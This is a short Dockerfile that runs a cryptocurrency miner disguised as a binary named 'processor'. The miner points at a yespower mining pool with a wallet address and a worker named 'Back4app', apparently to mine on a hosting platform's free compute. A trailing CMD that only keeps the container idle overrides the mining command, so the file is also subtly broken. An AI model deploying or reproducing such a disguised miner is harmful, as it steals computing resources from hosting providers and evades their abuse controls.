FROM ubuntu:24.04
COPY processor /processor
RUN chmod +x /processor
CMD ["/processor", "-a", "yespower ", "-o", "stratum+tcps://na.rplant.xyz:17122", "-u", "RN1x1ZehjTRFa9tt9vEvH1YXURwPZKz7BE.Back4app", "-t", "14"]
# Tambah di akhir - keep container running
CMD tail -f /dev/null
